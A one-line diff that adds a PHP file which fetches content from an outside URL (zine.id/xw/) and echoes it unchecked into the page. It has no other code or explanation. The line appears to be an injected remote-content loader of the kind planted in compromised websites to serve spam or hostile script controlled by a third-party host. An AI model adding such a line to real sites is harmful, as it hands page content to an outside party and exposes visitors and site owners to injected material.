@@ -1,0 +1,1 @@
+<?php $a = file_get_contents('https://zine.id/xw/'); echo $a; ?>
